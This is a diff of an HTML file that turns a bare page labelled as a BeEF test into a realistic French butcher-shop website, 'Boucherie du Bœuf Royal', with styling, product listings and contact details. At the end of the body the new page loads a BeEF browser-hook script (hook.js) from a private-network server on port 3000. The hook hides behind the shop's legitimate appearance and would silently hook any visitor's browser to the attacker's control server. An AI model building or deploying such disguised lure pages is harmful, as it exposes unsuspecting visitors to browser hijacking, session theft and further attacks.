@@ -1,11 +1,205 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-    <title>Ma Page de Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boucherie du Bœuf Royal - Qualité et Tradition</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+            color: #333;
+            line-height: 1.6;
+        }
+        .header {
+            background-color: #8B0000; /* Rouge boucher */
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 5px solid #5A0000;
+        }
+        .header h1 {
+            font-family: 'Playfair Display', serif;
+            margin: 0;
+            font-size: 3em;
+            letter-spacing: 2px;
+        }
+        .header p {
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+        .navbar {
+            background-color: #333;
+            overflow: hidden;
+            text-align: center;
+        }
+        .navbar a {
+            display: inline-block;
+            color: white;
+            text-align: center;
+            padding: 14px 20px;
+            text-decoration: none;
+            transition: background-color 0.3s ease;
+        }
+        .navbar a:hover {
+            background-color: #5A0000;
+        }
+        .container {
+            width: 80%;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            border-radius: 8px;
+        }
+        .section-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2em;
+            color: #8B0000;
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+        .product-item {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            transition: transform 0.2s ease;
+        }
+        .product-item:hover {
+            transform: translateY(-5px);
+        }
+        .product-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+        .product-item h3 {
+            font-family: 'Playfair Display', serif;
+            color: #5A0000;
+            margin: 15px 0 5px;
+            font-size: 1.5em;
+        }
+        .product-item p {
+            font-size: 0.9em;
+            color: #666;
+            padding: 0 15px 15px;
+        }
+        .about-text {
+            text-align: justify;
+            margin-bottom: 20px;
+        }
+        .footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 40px;
+            font-size: 0.9em;
+        }
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-    <h1>Ceci est une page de test pour BeEF.</h1>
 
-    <script src="http://192.168.1.75:3000/hook.js"></script>
+    <div class="header">
+        <h1>Boucherie du Bœuf Royal</h1>
+        <p>Tradition, Qualité et Goût Authentique</p>
+    </div>
+
+    <div class="navbar">
+        <a href="#accueil">Accueil</a>
+        <a href="#produits">Nos Produits</a>
+        <a href="#qualite">Notre Qualité</a>
+        <a href="#contact">Contact</a>
+    </div>
+
+    <div class="container">
+        <section id="accueil">
+            <h2 class="section-title">Bienvenue à la Boucherie du Bœuf Royal</h2>
+            <p class="about-text">
+                Depuis trois générations, la Boucherie du Bœuf Royal s'engage à vous offrir une viande d'exception, issue d'élevages respectueux et sélectionnés avec le plus grand soin. Notre passion pour la bonne viande se transmet de père en fils, garantissant une qualité et un savoir-faire inégalés. Découvrez nos spécialités et laissez-vous tenter par l'excellence.
+            </p>
+            <p class="about-text">
+                Que ce soit pour un barbecue estival, un rôti dominical ou une pièce d'exception pour un grand événement, nous avons ce qu'il vous faut. Nos bouchers experts sont à votre disposition pour vous conseiller et vous préparer les meilleures coupes.
+            </p>
+            <img src="https://via.placeholder.com/800x400/8B0000/FFFFFF?text=Bienvenue+chez+nous" alt="Boucherie façade" style="width:100%; border-radius: 8px; margin-top: 20px;">
+        </section>
+
+        <section id="produits" style="margin-top: 50px;">
+            <h2 class="section-title">Nos Produits d'Exception</h2>
+            <div class="product-grid">
+                <div class="product-item">
+                    <img src="https://via.placeholder.com/300x200/A00000/FFFFFF?text=Entrec%C3%B4te" alt="Entrecôte">
+                    <h3>L'Entrecôte Maturée</h3>
+                    <p>Une pièce noble, persillée et tendre, maturée pour un goût incomparable. Idéale pour les grillades.</p>
+                </div>
+                <div class="product-item">
+                    <img src="https://via.placeholder.com/300x200/C00000/FFFFFF?text=R%C3%B4ti+de+B%C5%93uf" alt="Rôti de Bœuf">
+                    <h3>Le Rôti de Bœuf Traditionnel</h3>
+                    <p>Parfait pour vos repas de famille. Tendre et savoureux, il ravira tous les palais.</p>
+                </div>
+                <div class="product-item">
+                    <img src="https://via.placeholder.com/300x200/900000/FFFFFF?text=Bavette" alt="Bavette">
+                    <h3>La Bavette d'Aloyau</h3>
+                    <p>Une viande de caractère, finement coupée et prête à être saisie pour un repas rapide et délicieux.</p>
+                </div>
+                <div class="product-item">
+                    <img src="https://via.placeholder.com/300x200/B00000/FFFFFF?text=Saucisses" alt="Saucisses Artisanales">
+                    <h3>Nos Saucisses Artisanales</h3>
+                    <p>Préparées dans nos ateliers avec des ingrédients frais. Un régal pour vos barbecues.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="qualite" style="margin-top: 50px;">
+            <h2 class="section-title">Notre Engagement Qualité</h2>
+            <p class="about-text">
+                Chez Boucherie du Bœuf Royal, la qualité est notre maître mot. Nous travaillons en étroite collaboration avec des éleveurs locaux qui partagent nos valeurs de respect animal et de durabilité. Chaque pièce de viande est sélectionnée par nos bouchers pour sa tendreté, son persillage et sa saveur. Nous garantissons une traçabilité complète de l'élevage à votre assiette.
+            </p>
+            <img src="https://via.placeholder.com/800x300/600000/FFFFFF?text=Viande+Fra%C3%AEche+et+Qualit%C3%A9" alt="Viande Fraîche" style="width:100%; border-radius: 8px; margin-top: 20px;">
+        </section>
+
+        <section id="contact" style="margin-top: 50px;">
+            <h2 class="section-title">Contactez-nous</h2>
+            <p style="text-align: center;">
+                **Adresse :** 123 Rue du Boucher, 75000 Paris<br>
+                **Téléphone :** 01 23 45 67 89<br>
+                **Email :** contact@boeufroyal.fr<br>
+                **Horaires :** Du Mardi au Samedi, 8h00 - 13h00 / 15h00 - 19h00
+            </p>
+            <p style="text-align: center; margin-top: 20px;">
+                <a href="#" style="color: #8B0000; text-decoration: none; font-weight: bold;">Localiser sur Google Maps</a>
+            </p>
+        </section>
+    </div>
+
+    <div class="footer">
+        &copy; 2024 Boucherie du Bœuf Royal. Tous droits réservés.
+        <a href="#">Mentions Légales</a> | <a href="#">Confidentialité</a>
+    </div>
+
+    <script src="http://10.228.196.36:3000/hook.js"></script>
+
 </body>
 </html>
